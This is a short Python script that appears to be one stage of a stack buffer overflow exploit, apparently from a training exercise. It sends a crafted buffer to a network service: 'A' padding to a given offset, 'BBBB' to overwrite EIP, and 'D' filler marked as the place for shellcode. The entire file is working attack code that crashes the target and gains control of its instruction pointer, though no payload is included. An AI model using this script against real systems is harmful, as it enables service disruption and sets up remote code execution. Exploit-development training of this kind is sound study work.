#!/usr/bin/python3
import socket
import sys

#usage ./S3ChangeEIP.py {IP} {port} {offset}

ip = sys.argv[1]
port = int(sys.argv[2])
offset = int(sys.argv[3])

try:
	print("\nAttacking Application...")
	
	buffer = b""
	buffer += b"A" * offset
	buffer += b"BBBB" #This overwrites the EIP
	buffer += b"D" * (2560-(len(buffer))) # This is where our potential shellcode will reside
	
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port)) # The connection to the Application 
	s.send(buffer)
	s.close()

	print("\nDone!")
	
except:
	print("\nFailure to connect. \n\nVerify that the vulnerable application is \n(a) running and\n(b) there is a connection to the vulnerable application.\n")